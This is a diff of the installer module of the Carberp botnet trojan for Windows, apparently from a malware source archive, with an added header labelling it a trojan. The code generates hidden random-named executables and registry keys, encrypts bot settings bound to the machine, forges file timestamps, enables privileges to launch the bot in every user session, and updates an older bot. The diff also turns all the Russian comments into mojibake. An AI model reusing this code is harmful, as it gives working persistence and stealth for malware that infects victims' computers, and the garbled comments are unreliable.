@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -27,32 +38,32 @@
 #include "..\common\registry.h"
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Настройки
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
-//Резервные секудны при генерации времени файла.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 #define FILETIME_GENERATOR_RESERVED_SECONDS (12 * 60 * 60)
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 /*
-  Генерация базового файла.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN path      - путь, где будет генерироваться файл. Путь должен сущестовать.
-  OUT name     - полное имя файла. Реально имя генерируемого файла до 20(4 + 6 + 1 + 5)
-                 символов.
-  IN extension - расширение файла, NULL для автогенерации.
-  IN lowAccess - включить доступ для Low Integrity приложений.
+  IN path      - пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT name     - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 20(4 + 6 + 1 + 5)
+                 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN extension - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, NULL пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN lowAccess - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Low Integrity пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return       - true - в случаи успеха,
-                 false - в случаи ошибки.
+  Return       - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                 false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool lowAccess)
 {
   WCHAR tmpPath[MAX_PATH];
   WCHAR ext[5];
 
-  //Генерируем расширение, если оно не указано.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(extension == NULL)
   {
     extension = ext;
@@ -60,7 +71,7 @@ static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool l
     MalwareTools::_GenerateRandomNameW(MalwareTools::NCF_ALL_LOWER, ext + 1, 3, (sizeof(ext) / sizeof(WCHAR)) - 2);
   }
 
-  //Создание директории.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     bool ok = false;
     if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_FIRST_UPPER, path, tmpPath, NULL, 4, 6))
@@ -79,7 +90,7 @@ static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool l
     }
   }
 
-  //Создание файла.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   {
     bool ok = false;
     if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_ALL_LOWER, tmpPath, name, extension, 4, 5))
@@ -104,12 +115,12 @@ static bool generateBasicFile(LPWSTR path, LPWSTR name, LPWSTR extension, bool l
 }
 
 /*
-  Получение Raw-адреса функции.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Raw-пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN ppe   - образ.
-  IN pData - данные в текущем образе.
+  IN ppe   - пїЅпїЅпїЅпїЅпїЅ.
+  IN pData - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return   - адрес данных в ppe, или NULL в случаи ошибки.
+  Return   - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ ppe, пїЅпїЅпїЅ NULL пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void *getRawOfData(PeImage::PEDATA *pe, void *data)
 {
@@ -123,19 +134,19 @@ static void *getRawOfData(PeImage::PEDATA *pe, void *data)
 }
 
 /*
-  Запись в файл.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 
-  IN data     - данные.
-  IN dataSize - размер данных.
-  IN fileName - файл.
-  IN infinite - пытаться записать файл бесконечно.
+  IN data     - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN dataSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN fileName - пїЅпїЅпїЅпїЅ.
+  IN infinite - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return      - true - в случаи успеха,
-                false - в случаи ошибки.
+  Return      - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool saveFile(const void *data, DWORD dataSize, LPWSTR fileName, bool infinite)
 {
-  //Иногда файл чемто занять после завершения процесса. Ждем...
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ...
   for(BYTE loop = 0;; loop++)
   {
     CWA(kernel32, SetFileAttributesW)(fileName, FILE_ATTRIBUTE_ARCHIVE);
@@ -155,14 +166,14 @@ static bool saveFile(const void *data, DWORD dataSize, LPWSTR fileName, bool inf
 }
 
 /*
-  Сохранение образа в PE-файл.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ PE-пїЅпїЅпїЅпїЅ.
 
-  IN pes         - настроки PE. Если NULL, происходит просто копирование текущего образа с оверлеем.
-  IN fileName    - имя файла.
-  IN infinite    - пытаться записать файл бесконечно.
+  IN pes         - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PE. пїЅпїЅпїЅпїЅ NULL, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN fileName    - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN infinite    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - true - в случаи успеха,
-                   false - в случаи ошибки.
+  Return         - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                   false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool savePeFile(const PESETTINGS *pes, const LPWSTR fileName, bool infinite)
 {
@@ -200,18 +211,18 @@ static bool savePeFile(const PESETTINGS *pes, const LPWSTR fileName, bool infini
 }
 
 /*
-  Функция для остановки сервисных потоков бота.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-  IN wait - TRUE - ожидать завершения сервисов,
-            FALSE - не ожидать заверешния сервисов.
+  IN wait - TRUE - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+            FALSE - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return  - TRUE - в случаи успеха,
-            FALSE - в случаи ошибки.
+  Return  - TRUE - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+            FALSE - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static BOOL WINAPI stopServices(void *reserved)
 {
   CWA(kernel32, SetEvent)(coreData.globalHandles.stopEvent);
-  //Если запусквыполенн из самого себя, ты мы не будем ждать самого себя.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(coreData.globalHandles.stopedEvent != CURRENT_PROCESS)CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopedEvent, INFINITE);
   return TRUE;
 }
@@ -226,12 +237,12 @@ typedef void (WINAPI *WTSFREEMEMORY)(PVOID memory);
 typedef BOOL (WINAPI *WTSQUERYUSERTOKEN)(ULONG sessionId, PHANDLE token);
 
 /*
-  Создание процесса в определенной сессии.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN queryUserToken - WTSQueryUserToken.
-  IN sessionId      - сессия.
-  IN sid            - если SID сессии не равен этому SID'у, процесс не создается.
-  IN fileName       - файл для запуска.  
+  IN sessionId      - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN sid            - пїЅпїЅпїЅпїЅ SID пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ SID'пїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN fileName       - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.  
 */
 static void createProcessForSession(WTSQUERYUSERTOKEN queryUserToken, DWORD sessionId, PSID sid, const LPWSTR fileName)
 {
@@ -260,10 +271,10 @@ static void createProcessForSession(WTSQUERYUSERTOKEN queryUserToken, DWORD sess
 }
 
 /*
-  Поиск активных сессий пользователя, и запуск из под них процессов.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN sid      - SID пользоваетеля.
-  IN fileName - файл для запуска.
+  IN sid      - SID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN fileName - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void tryToRunForActiveSessions(PSID sid, const LPWSTR fileName)
 {
@@ -293,16 +304,16 @@ static void tryToRunForActiveSessions(PSID sid, const LPWSTR fileName)
     
     if(enumerateSessions != NULL && freeMemory != NULL && queryUserToken != NULL)
     {
-      Process::_enablePrivilege(SE_TCB_NAME, true); //Для WTSQueryUserToken.
+      Process::_enablePrivilege(SE_TCB_NAME, true); //пїЅпїЅпїЅ WTSQueryUserToken.
       
-      //Интерактивную сессию обрабатываем отдельно, на случай если терминальный сервер не запущен и т.д.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ.пїЅ.
       DWORD activeSession = CWA(kernel32, WTSGetActiveConsoleSessionId)();
       WDEBUG1(WDDT_INFO, "activeSession=%u.", activeSession);
       
-      //Смотрим интерактивную сессию.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       if(activeSession != (DWORD)-1)createProcessForSession(queryUserToken, activeSession, sid, fileName);
 
-      //Проматриваем все сессии кроме интерактивной.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       {
         PWTS_SESSION_INFOW sessions;
         DWORD sessionsCount;
@@ -338,18 +349,18 @@ bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
   WCHAR pathReportFile[MAX_PATH];
   WCHAR pathRegKey[10];
   
-  //На всякий случай.
+  //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(CWA(kernel32, GetFileAttributesW)(pathHome) == INVALID_FILE_ATTRIBUTES)Fs::_createDirectoryTree(pathHome, NULL);
 
   if(generateBasicFile(pathHome, pathCoreFile, FILEEXTENSION_EXECUTABLE, false) &&
      generateBasicFile(pathHome, pathReportFile, NULL, true) &&
      MalwareTools::_GenerateRandomRegKeyName(MalwareTools::NCF_FIRST_UPPER, HKEY_CURRENT_USER, PATH_REGKEY, pathRegKey, 4, 6))
   {
-    //Пишим првязки к текущей ОС и юзеру.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
     PESETTINGS pes;
     Mem::_zero(&pes, sizeof(PESETTINGS));
 
-    //Заполняем данные ОС.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ.
     Core::_generateBotId(pes.compId);
     MalwareTools::_getOsGuid(&pes.guid);
     Crypt::_generateRc4Key(&pes.rc4Key);
@@ -357,15 +368,15 @@ bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
     pes.size = sizeof(PESETTINGS);
     WDEBUG5(WDDT_INFO, "Current OS guid {%08X-%04X-%04X-%08X%08X}.", pes.guid.Data1, pes.guid.Data2, pes.guid.Data3, *((LPDWORD)&pes.guid.Data4[0]), *((LPDWORD)&pes.guid.Data4[4]));
 
-    //Все это дело может быть сохранено только с участием символов <127, поэтому нет смысла хранить
-    //их в Юникоде.
+    //пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ <127, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+    //пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
       DWORD pathHomeSize = Str::_LengthW(pathHome) + 1;
       Str::_unicodeToAnsi(pathCoreFile + pathHomeSize,   -1, pes.userPaths.coreFile,   sizeof(pes.userPaths.coreFile) / sizeof(char));
       Str::_unicodeToAnsi(pathReportFile + pathHomeSize, -1, pes.userPaths.reportFile, sizeof(pes.userPaths.reportFile) / sizeof(char));
       Str::_unicodeToAnsi(pathRegKey,                    -1, pes.userPaths.regKey,     sizeof(pes.userPaths.regKey) / sizeof(char));
       
-      //Генерируем значения в реестре.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       {
         LPSTR values[3];
         values[0] = pes.userPaths.regDynamicConfig;
@@ -379,17 +390,17 @@ bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
         }
       }
 
-      //Случайно число для заражения процессов.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       pes.processInfecionId = MAKELONG(Crypt::mtRandRange(0x1, 0xFFFF), Crypt::mtRandRange(0x1, 0xFFFF));
 
-      //XOR ключ для хранения отчетов.
+      //XOR пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       pes.storageArrayKey = MAKELONG(Crypt::mtRandRange(0x1, 0xFFFF), Crypt::mtRandRange(0x1, 0xFFFF));
       
       WDEBUG6(WDDT_INFO, "pes.userPaths.coreFile=[%S], pes.userPaths.reportFile=[%S], pes.userPaths.regKey=[%S], pes.userPaths.regDynamicConfig=[%S], pes.userPaths.regLocalConfig=[%S], pes.userPaths.regLocalSettings=[%S]",
               pes.userPaths.coreFile, pes.userPaths.reportFile, pes.userPaths.regKey, pes.userPaths.regDynamicConfig, pes.userPaths.regLocalConfig, pes.userPaths.regLocalSettings);
     }
 
-    //Шифруем
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     {
       BASECONFIG baseConfig;
       Core::getBaseConfig(&baseConfig);
@@ -399,10 +410,10 @@ bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
       Crypt::_rc4(&pes, sizeof(PESETTINGS), &rc4k);
     }
 
-    //Генерируем копию файла.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(savePeFile(&pes, pathCoreFile, false))
     {
-      //Изменяем время файлов.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       FILETIME fileTimeTemplate;
       if(Fs::_getFileTime(true, pathHome, &fileTimeTemplate, NULL, NULL))
       {
@@ -411,12 +422,12 @@ bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
         Fs::_setRandomFileTime(fileTimeUnixTemplate, FILETIME_GENERATOR_RESERVED_SECONDS, pathReportFile, 1);
       }
       
-      //Финал.
+      //пїЅпїЅпїЅпїЅпїЅ.
       Mem::_copy(&coreData.peSettings, &pes, sizeof(PESETTINGS));
       Str::_CopyW(coreFile, pathCoreFile, -1);
       ok = true;
     }
-    Mem::_zero(&pes, sizeof(PESETTINGS)); //На всякий случай.
+    Mem::_zero(&pes, sizeof(PESETTINGS)); //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   }
 # if(BO_DEBUG > 0)
   else WDEBUG0(WDDT_ERROR, "Failed to generate names.");
@@ -427,17 +438,17 @@ bool CoreInstall::_install(const LPWSTR pathHome, LPWSTR coreFile)
 
 bool CoreInstall::_loadInstalledData(const void *overlay, DWORD overlaySize)
 {
-  //Получаем PESETTINGS. Преднамерено не проверяем ошибки.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PESETTINGS. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   Mem::_copy(&coreData.peSettings, overlay, sizeof(PESETTINGS));
 
   PESETTINGS ps;
   Core::getPeSettings(&ps);
 
-  //Проверяем.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   WDEBUG5(WDDT_INFO, "Current OS guid {%08X-%04X-%04X-%08X%08X}.", ps.guid.Data1, ps.guid.Data2, ps.guid.Data3, *((LPDWORD)&ps.guid.Data4[0]), *((LPDWORD)&ps.guid.Data4[4]));
   if(Mem::_compare(&coreData.osGuid, &ps.guid, sizeof(GUID)) == 0)
   {
-    //Проверяем пути.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
     int coreLenght = Str::_LengthW(coreData.paths.process);
     int homeLenght = Str::_LengthW(coreData.paths.home);
     WCHAR coreFile[sizeof(ps.userPaths.coreFile) / sizeof(char)];
@@ -445,10 +456,10 @@ bool CoreInstall::_loadInstalledData(const void *overlay, DWORD overlaySize)
     Str::_ansiToUnicode(ps.userPaths.coreFile, -1, coreFile, sizeof(coreFile) / sizeof(WCHAR));
 
     if(coreLenght > homeLenght && coreData.paths.process[homeLenght] == '\\' &&
-       CWA(shlwapi, StrCmpNIW)(coreData.paths.home, coreData.paths.process, homeLenght) == 0 && //Файл запушен из домшней директории.
-       CWA(kernel32, lstrcmpiW)(coreFile, coreData.paths.process + homeLenght + 1) == 0) //Файл запушен из номарльного пути домашней директории.
+       CWA(shlwapi, StrCmpNIW)(coreData.paths.home, coreData.paths.process, homeLenght) == 0 && //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+       CWA(kernel32, lstrcmpiW)(coreFile, coreData.paths.process + homeLenght + 1) == 0) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     {
-      //Номарльный запуск.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       return true;
     }
 #   if(BO_DEBUG > 0)
@@ -465,12 +476,12 @@ bool CoreInstall::_update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR cor
 {
   bool ok = false;  
 
-  //Проверяем основные условия.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(bs->structSize == sizeof(BotStatus::VER1) && ((force == true && bs->version <= BO_CLIENT_VERSION) || bs->version < BO_CLIENT_VERSION))
   {
     WDEBUG4(WDDT_INFO, "Updating existing bot %u.%u.%u.%u to current version.", VERSION_MAJOR(bs->version), VERSION_MINOR(bs->version), VERSION_SUBMINOR(bs->version), VERSION_BUILD(bs->version));
     
-    //Заполняем PESETTINGS.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PESETTINGS.
     PESETTINGS pes;
     Mem::_zero(&pes, sizeof(PESETTINGS));
     {
@@ -488,17 +499,17 @@ bool CoreInstall::_update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR cor
       Str::_unicodeToAnsi(bs->userPaths.regLocalConfig,   -1, pes.userPaths.regLocalConfig,   CORE_REGISTRY_VALUE_BUFFER_SIZE);
       Str::_unicodeToAnsi(bs->userPaths.regLocalSettings, -1, pes.userPaths.regLocalSettings, CORE_REGISTRY_VALUE_BUFFER_SIZE);
 
-      //Случайно число для заражения процессов.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       pes.processInfecionId = MAKELONG(Crypt::mtRandRange(0x1, 0xFFFF), Crypt::mtRandRange(0x1, 0xFFFF));
       
-      //XOR ключ для хранения отчетов.
+      //XOR пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       pes.storageArrayKey = bs->storageArrayKey;
       
       WDEBUG6(WDDT_INFO, "pes.userPaths.coreFile=[%S], pes.userPaths.reportFile=[%S], pes.userPaths.regKey=[%S], pes.userPaths.regDynamicConfig=[%S], pes.userPaths.regLocalConfig=[%S], pes.userPaths.regLocalSettings=[%S]",
               pes.userPaths.coreFile, pes.userPaths.reportFile, pes.userPaths.regKey, pes.userPaths.regDynamicConfig, pes.userPaths.regLocalConfig, pes.userPaths.regLocalSettings);
     }
 
-    //Шифруем
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     {
       BASECONFIG baseConfig;
       Core::getBaseConfig(&baseConfig);
@@ -508,7 +519,7 @@ bool CoreInstall::_update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR cor
       Crypt::_rc4(&pes, sizeof(PESETTINGS), &rc4k);
     }
     
-    //Останавливаем запущеные сервисы.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(bs->stopServices != NULL)
     {
       WDEBUG0(WDDT_INFO, "Stopping old bot...");
